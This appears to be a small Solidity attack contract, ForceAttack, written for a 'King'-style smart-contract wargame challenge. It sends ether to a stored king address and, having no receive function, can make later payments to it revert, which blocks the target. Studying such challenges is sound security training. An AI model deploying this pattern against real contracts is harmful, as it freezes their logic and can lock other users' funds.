//"SPDX-License-Identifier: MIT"
pragma solidity ^0.8.7;

contract ForceAttack {
  address king;
  constructor(address _king) {
    king = _king;
  }

  function attack() payable external {
    king.call{ value: msg.value }("");
  }
}